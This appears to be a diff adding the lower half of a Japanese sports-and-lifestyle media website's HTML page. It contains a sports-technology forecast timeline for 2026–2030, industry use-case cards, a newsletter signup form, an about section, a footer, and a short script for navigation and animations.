+                <p>世界のスポーツイベントやアスリートのトレーニングデータを収集・解析し、戦略立案やスカウティングに利用されています。</p>
+            </div>
+            <div class="tech-card">
+                <div class="tech-number">99<span>%</span></div>
+                <h4>ウェアラブル精度向上</h4>
+                <p>最新センサー技術により、心拍数、消費カロリー、ストレスレベルなどの計測精度が99%に到達。医療レベルに近づいています。</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- Forecast Section -->
+<section id="forecast">
+    <div class="container">
+        <div class="text-center">
+            <span class="section-label">将来予測</span>
+            <h2 class="section-title">スポーツ＆ライフスタイル進化ロードマップ<br>2026年〜2030年</h2>
+            <p class="section-desc">専門家の分析に基づく、スポーツテクノロジーと健康習慣の主要マイルストーン。</p>
+        </div>
+        <div class="forecast-timeline">
+            <div class="timeline-item">
+                <div class="timeline-dot">2026</div>
+                <div class="timeline-content">
+                    <h4>ウェアラブル完全浸透・AIコーチ普及</h4>
+                    <p>スマートウォッチ装着率が成人の70%超に。AIが日々の運動・食事・睡眠を総合的に最適化するパーソナルコーチが一般化。</p>
+                </div>
+            </div>
+            <div class="timeline-item">
+                <div class="timeline-dot">2027</div>
+                <div class="timeline-content">
+                    <h4>バーチャルスポーツの拡大</h4>
+                    <p>VR/ARを使ったeスポーツやフィットネスゲームが本格化。自宅でプロ選手と対戦・共演できるプラットフォームが登場。</p>
+                </div>
+            </div>
+            <div class="timeline-item">
+                <div class="timeline-dot">2028</div>
+                <div class="timeline-content">
+                    <h4>予防医療とスポーツの融合</h4>
+                    <p>健康保険と連動したパーソナライズド運動プログラムが標準化。運動習慣が医療費削減に直結する仕組みが確立。</p>
+                </div>
+            </div>
+            <div class="timeline-item">
+                <div class="timeline-dot">2029</div>
+                <div class="timeline-content">
+                    <h4>宇宙スポーツ時代の幕開け</h4>
+                    <p>低重力環境でのトレーニング技術が開発され、宇宙空間での運動プログラムが一般化。地球上のリハビリにも応用される。</p>
+                </div>
+            </div>
+            <div class="timeline-item">
+                <div class="timeline-dot">2030</div>
+                <div class="timeline-content">
+                    <h4>健康寿命延伸・1.2兆ドル市場</h4>
+                    <p>AIとバイオテクノロジーが統合され、個人の遺伝子・腸内環境に最適化された運動・栄養プランが提供される。市場規模は1.2兆ドルに到達。</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- Industry Section -->
+<section id="industry">
+    <div class="container">
+        <div class="text-center">
+            <span class="section-label" style="color:#60a5fa;">分野別分析</span>
+            <h2 class="section-title" style="color:white;">スポーツ関連業界の活用事例</h2>
+            <p class="section-desc" style="color:rgba(255,255,255,0.7);margin-left:auto;margin-right:auto;">各セクターでのテクノロジー導入と変革インパクトをまとめました。</p>
+        </div>
+        <div class="industry-grid">
+            <div class="industry-card">
+                <div class="industry-icon">🏋️</div>
+                <h4>フィットネスジム</h4>
+                <p>AIトレーニングマシン、オンラインクラス、会員管理の自動化で顧客体験を革新。</p>
+            </div>
+            <div class="industry-card">
+                <div class="industry-icon">⚽</div>
+                <h4>プロスポーツ</h4>
+                <p>戦術解析、選手のコンディション管理、怪我予防、ファンエンゲージメントにAIとデータを活用。</p>
+            </div>
+            <div class="industry-card">
+                <div class="industry-icon">🏃</div>
+                <h4>ランニング・アウトドア</h4>
+                <p>GPSトラッキング、ルート提案、コミュニティ機能を統合したアプリが人気。</p>
+            </div>
+            <div class="industry-card">
+                <div class="industry-icon">🧘</div>
+                <h4>ウェルネス・マインドフルネス</h4>
+                <p>瞑想アプリ、バイオフィードバックデバイスでストレス軽減と集中力向上を支援。</p>
+            </div>
+            <div class="industry-card">
+                <div class="industry-icon">🥾</div>
+                <h4>アウトドア用品</h4>
+                <p>スマートギア（温度調整ウェア、GPS装備）の開発が進む。サステナブル素材の採用も拡大。</p>
+            </div>
+            <div class="industry-card">
+                <div class="industry-icon">🏥</div>
+                <h4>リハビリ・医療</h4>
+                <p>VRリハビリ、ロボットスーツ、遠隔モニタリングで患者の回復速度が向上。</p>
+            </div>
+            <div class="industry-card">
+                <div class="industry-icon">📱</div>
+                <h4>ヘルステックアプリ</h4>
+                <p>食事・運動・睡眠を一元管理し、ユーザーの健康スコアを可視化。保険会社との連携も拡大。</p>
+            </div>
+            <div class="industry-card">
+                <div class="industry-icon">🎮</div>
+                <h4>eスポーツ・ゲーミング</h4>
+                <p>フィットネスゲームやARスポーツが急成長。プロプレイヤーのトレーニングにも運動要素が取り入れられる。</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- Newsletter Section -->
+<section id="newsletter">
+    <div class="container">
+        <div class="cta-box">
+            <h2>📄 無料スポーツ＆ライフスタイルレポートを入手</h2>
+            <p>最新のスポーツテクノロジー、健康習慣、アウトドア情報をメールでお届けします。登録は完全無料です。</p>
+            <form class="cta-form" onsubmit="handleSubmit(event)">
+                <input type="email" id="emailInput" placeholder="メールアドレスを入力" required>
+                <button type="submit">無料で登録</button>
+            </form>
+            <div class="success-msg" id="successMsg">
+                ✅ ご登録ありがとうございます！確認メールをお送りしました。
+            </div>
+            <p class="cta-note">プライバシーポリシーに基づき、個人情報は厳重に管理します。いつでも配信解除が可能です。</p>
+        </div>
+    </div>
+</section>
+
+<!-- About Section -->
+<section id="about">
+    <div class="container">
+        <div class="about-grid">
+            <div class="about-text">
+                <span class="section-label">私たちについて</span>
+                <h2 class="section-title">スポーツライフラボについて</h2>
+                <p>スポーツライフラボは、スポーツ科学、健康テクノロジー、アクティブライフスタイルの最新動向を調査・分析・発信する専門メディアです。2020年の設立以来、アスリート、トレーナー、健康志向の個人向けに信頼性の高い情報を提供し続けています。</p>
+                <p>私たちのチームは、スポーツ医科学者、データアナリスト、実績のあるコーチで構成されており、科学的根拠と実践的視点から独自のインサイトをお届けします。</p>
+            </div>
+            <div class="about-features">
+                <div class="about-feature">
+                    <div class="about-feature-icon">🔬</div>
+                    <div>
+                        <h5>科学的根拠に基づく情報</h5>
+                        <p>最新の研究論文や臨床データを精査し、信頼できる情報を提供しています。</p>
+                    </div>
+                </div>
+                <div class="about-feature">
+                    <div class="about-feature-icon">📱</div>
+                    <div>
+                        <h5>実践的なアドバイス</h5>
+                        <p>専門家の知見を日常に活かせる形で提供。アプリ・機器の選び方もサポート。</p>
+                    </div>
+                </div>
+                <div class="about-feature">
+                    <div class="about-feature-icon">🌏</div>
+                    <div>
+                        <h5>グローバル視点</h5>
+                        <p>世界各国のスポーツ文化や健康トレンドを横断的にカバー。日本の読者にも最適化。</p>
+                    </div>
+                </div>
+                <div class="about-feature">
+                    <div class="about-feature-icon">✅</div>
+                    <div>
+                        <h5>ファクトチェック徹底</h5>
+                        <p>すべての記事は専門家レビューを経て、正確性を担保しています。</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- Footer -->
+<footer>
+    <div class="footer-top">
+        <div class="footer-brand">
+            <div class="logo" style="color:white;margin-bottom:14px;">
+                <div class="logo-icon">🏋️</div>
+                <span class="logo-text" style="color:white;">スポーツライフラボ</span>
+            </div>
+            <p>スポーツテクノロジー・健康・アクティブライフの専門メディア。あなたのライフスタイルを進化させます。</p>
+        </div>
+        <div class="footer-col">
+            <h6>コンテンツ</h6>
+            <ul>
+                <li><a href="#trends">最新トレンド</a></li>
+                <li><a href="#market">市場分析</a></li>
+                <li><a href="#technology">技術動向</a></li>
+                <li><a href="#forecast">将来予測</a></li>
+                <li><a href="#industry">分野別事例</a></li>
+            </ul>
+        </div>
+        <div class="footer-col">
+            <h6>リソース</h6>
+            <ul>
+                <li><a href="#">無料レポート</a></li>
+                <li><a href="#">ホワイトペーパー</a></li>
+                <li><a href="#">ウェビナー</a></li>
+                <li><a href="#">用語集</a></li>
+                <li><a href="#">お問い合わせ</a></li>
+            </ul>
+        </div>
+        <div class="footer-col">
+            <h6>法的情報</h6>
+            <ul>
+                <li><a href="#">プライバシーポリシー</a></li>
+                <li><a href="#">利用規約</a></li>
+                <li><a href="#">免責事項</a></li>
+                <li><a href="#">特定商取引法</a></li>
+                <li><a href="#">Cookie設定</a></li>
+            </ul>
+        </div>
+    </div>
+    <div class="footer-bottom">
+        <p>
+            © 2026 スポーツライフラボ. All Rights Reserved.
+            <a href="#">プライバシーポリシー</a>
+            <a href="#">利用規約</a>
+            <a href="#">免責事項</a>
+            <a href="#">お問い合わせ</a>
+        </p>
+        <p style="margin-top:8px;">本サイトに掲載されている情報は一般的な情報提供を目的としており、医学的・専門的なアドバイスを構成するものではありません。運動前には医師に相談してください。</p>
+    </div>
+</footer>
+
+<!-- Scroll to Top -->
+<button class="scroll-top" id="scrollTop" onclick="window.scrollTo({top:0,behavior:'smooth'})" aria-label="トップへ戻る">↑</button>
+
+<script>
+    function toggleMobileNav() {
+        const nav = document.getElementById('mobileNav');
+        nav.classList.toggle('open');
+    }
+
+    window.addEventListener('scroll', () => {
+        const btn = document.getElementById('scrollTop');
+        if (window.scrollY > 400) btn.classList.add('visible');
+        else btn.classList.remove('visible');
+    });
+
+    function handleSubmit(e) {
+        e.preventDefault();
+        const input = document.getElementById('emailInput');
+        const msg = document.getElementById('successMsg');
+        if (input.value) {
+            msg.style.display = 'block';
+            input.value = '';
+            setTimeout(() => { msg.style.display = 'none'; }, 5000);
+        }
+    }
+
+    // Animate bars when in view
+    const observer = new IntersectionObserver((entries) => {
+        entries.forEach(entry => {
+            if (entry.isIntersecting) {
+                entry.target.style.animationPlayState = 'running';
+            }
+        });
+    }, { threshold: 0.2 });
+
+    document.querySelectorAll('.bar-fill').forEach(bar => {
+        bar.style.animationPlayState = 'paused';
+        observer.observe(bar);
+    });
+</script>
+</body>
+</html>
